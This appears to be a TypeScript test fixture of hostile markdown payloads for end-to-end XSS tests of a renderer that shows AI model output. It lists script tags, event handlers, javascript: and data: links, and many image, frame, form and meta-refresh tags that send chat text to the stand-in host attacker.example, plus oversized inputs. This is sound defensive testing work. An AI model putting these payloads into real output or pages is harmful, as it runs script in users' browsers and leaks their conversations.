// Hostile model output for /e2e/markdown and e2e/xss.spec.ts. Every payload that could run script
// tries to set `window.__xss`; every one that could load something points at ATTACKER_ORIGIN, which
// the e2e fixture fails on. (The leading "-" keeps the route generator from treating this as a page.)

export const ATTACKER_ORIGIN = "https://attacker.example";
const RUN = "window.__xss=1";
const LEAK = `${ATTACKER_ORIGIN}/leak?chat=the+users+secret+plan`;

export interface XssPayload {
	name: string;
	markdown: string;
}

export const XSS_PAYLOADS: readonly XssPayload[] = [
	{ name: "script tag", markdown: `Hello <script>${RUN}</script> world` },
	{
		name: "inline event handlers",
		markdown: [
			`<img src="x" onerror="${RUN}">`,
			`<svg onload="${RUN}"></svg>`,
			`<details open ontoggle="${RUN}"><summary>s</summary>d</details>`,
			`<p onmouseover="${RUN}" style="position:fixed;inset:0">cover</p>`,
		].join("\n\n"),
	},
	{
		name: "javascript links",
		markdown: [
			`[inline](javascript:${RUN})`,
			`[spaced]( javascript:${RUN} )`,
			`[cased](JaVaScRiPt:${RUN})`,
			`[entity](&#106;avascript:${RUN})`,
			`<a href="javascript:${RUN}">raw html</a>`,
			`[data](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)`,
			`[vbscript](vbscript:msgbox)`,
			`<javascript:${RUN}>`,
		].join("\n\n"),
	},
	{
		name: "reference-style links",
		markdown: [
			"[looks safe][1] and [also safe][docs] and ![chart][img]",
			"",
			`[1]: javascript:${RUN}`,
			`[docs]: ${LEAK} "Documentation"`,
			`[img]: ${LEAK}&via=reference-image`,
		].join("\n"),
	},
	{
		name: "remote images",
		markdown: [
			`![tracking pixel](${LEAK})`,
			`<img src="${LEAK}&via=html">`,
			`<picture><source srcset="${LEAK}&via=srcset"><img src="${LEAK}&via=picture"></picture>`,
			`<video poster="${LEAK}&via=poster" src="${LEAK}&via=video"></video>`,
			`<audio src="${LEAK}&via=audio"></audio>`,
			`<input type="image" src="${LEAK}&via=input">`,
		].join("\n\n"),
	},
	{
		name: "frames, forms and page takeovers",
		markdown: [
			`<iframe src="${LEAK}&via=iframe"></iframe>`,
			`<object data="${LEAK}&via=object"></object>`,
			`<embed src="${LEAK}&via=embed">`,
			`<form action="${LEAK}&via=form"><button>Submit</button></form>`,
			`<base href="${ATTACKER_ORIGIN}/">`,
			`<meta http-equiv="refresh" content="0;url=${LEAK}">`,
			`<link rel="stylesheet" href="${LEAK}&via=link">`,
			`<style>body{background:url("${LEAK}&via=style")}</style>`,
		].join("\n\n"),
	},
	{
		name: "allowed links",
		markdown: [
			"[docs](https://example.com/docs) and [plain](http://example.org)",
			"[mail](mailto:someone@example.com)",
			"[spoofed](https://attacker.example/login) says it goes to example.com",
		].join("\n\n"),
	},
];

// Big inputs: each must render without hanging or crashing the page.
export const HUGE_PAYLOADS: readonly XssPayload[] = [
	{ name: "200k characters", markdown: "lorem ipsum ".repeat(17_000) },
	{ name: "deep blockquotes", markdown: `${"> ".repeat(2_000)}deep` },
	{ name: "deep lists", markdown: "- ".repeat(2_000).concat("deep") },
	{ name: "unclosed emphasis", markdown: "*_".repeat(20_000) },
	{
		name: "many links",
		markdown: Array.from(
			{ length: 2_000 },
			(_, index) => `[link ${index}](javascript:${RUN})`,
		).join(" "),
	},
	{
		name: "long table",
		markdown: [
			"| a | b |",
			"| - | - |",
			...Array.from({ length: 2_000 }, (_, index) => `| ${index} | x |`),
		].join("\n"),
	},
];
